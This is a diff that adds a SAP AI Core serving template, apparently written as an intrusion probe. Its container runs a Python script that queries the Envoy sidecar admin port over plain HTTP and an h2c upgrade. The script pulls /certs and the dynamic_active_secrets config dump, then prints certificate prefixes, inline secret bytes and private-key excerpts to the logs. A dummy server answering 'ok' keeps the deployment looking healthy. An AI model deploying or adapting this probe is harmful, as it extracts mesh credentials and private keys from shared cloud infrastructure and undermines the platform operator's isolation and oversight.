@@ -1,0 +1,125 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: h2c-verify
+  labels:
+    scenarios.ai.sap.com/id: "h2c-verify-scenario"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "h2c-verify-scenario"
+    executables.ai.sap.com/name: "h2c-verify"
+    executables.ai.sap.com/description: "envoy-admin-h2c-verify"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            cat > /tmp/probe.py <<'PYEOF'
+            import socket, re
+
+            def fetch(path, label, h2c=False):
+                try:
+                    s = socket.create_connection(("127.0.0.1", 15000), timeout=15)
+                    if h2c:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\n"
+                            f"User-Agent: probe\r\n"
+                            f"Accept: */*\r\n"
+                            f"Connection: Upgrade, HTTP2-Settings\r\n"
+                            f"Upgrade: h2c\r\n"
+                            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
+                            f"\r\n"
+                        )
+                    else:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\n"
+                            f"User-Agent: probe\r\n"
+                            f"Accept: */*\r\n"
+                            f"Connection: close\r\n"
+                            f"\r\n"
+                        )
+                    s.sendall(req.encode())
+                    data = b""
+                    while True:
+                        chunk = s.recv(65536)
+                        if not chunk:
+                            break
+                        data += chunk
+                        if len(data) > 4_000_000:
+                            break
+                    s.close()
+                except Exception as e:
+                    print(f"[H2C] {label} ERR: {e}", flush=True)
+                    return
+                head, _, body = data.partition(b"\r\n\r\n")
+                head_text = head.decode("latin1", "replace")
+                status_line = head_text.split("\r\n", 1)[0]
+                body_len = len(body)
+                has_cert_pem = b"BEGIN CERTIFICATE" in body
+                has_dynamic_secrets = b"dynamic_active_secrets" in body
+                has_spiffe = b"spiffe://cluster.local" in body
+                has_inline_bytes = b"inline_bytes" in body
+                has_pk_block = b'"private_key":' in body
+                head_excerpt = head_text[:300].replace("\r", "\\r").replace("\n", "\\n")
+                body_excerpt = body[:200].decode("latin1", "replace").replace("\r", "\\r").replace("\n", "\\n")
+                print(f"[H2C] {label} status={status_line}", flush=True)
+                print(f"[H2C] {label} headers={head_excerpt}", flush=True)
+                print(f"[H2C] {label} body_len={body_len}", flush=True)
+                print(f"[H2C] {label} markers: cert_pem={has_cert_pem} dynamic_secrets={has_dynamic_secrets} spiffe={has_spiffe} inline_bytes={has_inline_bytes} private_key_block={has_pk_block}", flush=True)
+                if has_cert_pem:
+                    m = re.search(rb"-----BEGIN CERTIFICATE-----\s*([A-Za-z0-9+/=\s]+?)-----END CERTIFICATE-----", body)
+                    if m:
+                        first_80 = m.group(1).replace(b"\n", b"").replace(b" ", b"")[:80].decode()
+                        print(f"[H2C] {label} cert_b64_prefix={first_80}", flush=True)
+                if has_inline_bytes:
+                    for i, m in enumerate(re.finditer(rb'"inline_bytes":\s*"([A-Za-z0-9+/=]+)"', body)):
+                        if i >= 3:
+                            break
+                        ib = m.group(1).decode()[:80]
+                        print(f"[H2C] {label} inline_bytes[{i}]_prefix={ib}", flush=True)
+                if has_pk_block:
+                    m = re.search(rb'"private_key":\s*\{[^}]{0,500}\}', body)
+                    if m:
+                        pk_excerpt = m.group(0)[:300].decode("latin1", "replace").replace("\r", "\\r").replace("\n", "\\n")
+                        print(f"[H2C] {label} private_key_block={pk_excerpt}", flush=True)
+                print(f"[H2C] {label} body_excerpt={body_excerpt}", flush=True)
+                print(f"[H2C] ----", flush=True)
+
+            print("[H2C] START envoy-admin-h2c-verify", flush=True)
+
+            fetch("/", "ROOT_plain", h2c=False)
+            fetch("/certs", "CERTS_plain", h2c=False)
+            fetch("/certs", "CERTS_h2c", h2c=True)
+            fetch("/config_dump?resource=dynamic_active_secrets", "SECRETS_plain", h2c=False)
+            fetch("/config_dump?resource=dynamic_active_secrets", "SECRETS_h2c", h2c=True)
+            fetch("/server_info", "SERVER_INFO_plain", h2c=False)
+            fetch("/runtime", "RUNTIME_plain", h2c=False)
+            fetch("/listeners?format=json", "LISTENERS_plain", h2c=False)
+            fetch("/stats?filter=server.live|sds.|secret", "STATS_plain", h2c=False)
+
+            print("[H2C] DONE", flush=True)
+            PYEOF
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
